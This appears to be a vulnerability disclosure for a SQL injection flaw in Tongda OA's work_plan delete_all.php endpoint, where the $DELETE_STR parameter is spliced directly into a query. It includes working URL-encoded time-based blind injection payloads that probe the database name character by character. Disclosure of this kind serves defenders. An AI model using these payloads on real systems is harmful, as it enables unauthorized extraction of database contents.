SQL injection vulnerability exists in Tongda OA

Route: general/work_plan/manage/delete_all.php

There is an injected parameter: $DELETE_STR

The code here is very concise. When $DELETE_STR is not empty, the parameters are directly spliced ​​into the SQL statement. Since the parentheses are closed here, there is a bypass.

![image](https://github.com/willchen0011/cve/assets/13689053/2c80fee9-a175-4abe-afbe-bd108ea969a0)

2.Payload
We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.

```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/willchen0011/cve/assets/13689053/0e8af1ca-b53a-482c-945a-58a853f39192)

And when we change 116 to 115, there is no delay here, indicating that there is SQL injection.

```
1)%20and%20(substr(DATABASE(),1,1))=char(115)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/willchen0011/cve/assets/13689053/5ec2fa8f-8778-4c3f-bbba-9f9ef74ef806)


